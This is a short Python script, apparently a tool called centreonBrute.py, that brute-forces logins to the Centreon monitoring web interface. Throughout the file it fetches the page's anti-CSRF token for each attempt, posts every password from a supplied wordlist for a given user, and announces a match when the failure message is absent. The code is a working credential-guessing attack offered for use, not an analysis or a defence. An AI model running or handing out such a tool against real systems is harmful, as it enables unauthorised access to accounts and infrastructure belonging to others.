#!/bin/python

import requests
import sys
import time

CRED = '\033[91m'
CYELLOWBG = '\33[33m'
CBLUE = '\33[34m'
CEND = '\033[0m'

def getToken(page):
	for line in page.text.splitlines():
        	if 'centreon_token' in line:
	        	value = line.split()[3].split('"')[1]
			return value

def force(req,info):
	failed= "credentials are incorrect"
	reqpost = req.post(sys.argv[1],info)
	if failed not in reqpost.text:
		print ""
		print (CBLUE + "[+]" + CEND + " Correct password Found: " + CYELLOWBG + info.get('password') + CEND)
		sys.exit()
	else:
		s = "[+] Trying User: " + CYELLOWBG + info.get('useralias') + CEND + " Password: " + CRED + info.get('password') + CEND + " With Token: "+ CBLUE + info.get('centreon_token') + CEND
		print '{0}\r'.format(s),
		sys.stdout.flush()


if len(sys.argv) != 4:
	print ("Need three arguments : url, user, password list")
	print ("python centreonBrute.py http://<IP>/centreon/index.php user passwordList")

else:
	req = requests.session()
	passwords = [w.strip() for w in open(sys.argv[3],"rb").readlines()]

	for passwd in passwords:
		req = requests.session()
		page = req.get(sys.argv[1])
		token = getToken(page)
		info = {
	        	"useralias": sys.argv[2],
		        "password": passwd,
		        "submitLogin": "Connect",
		        "centreon_token": token
		}
		force(req,info)
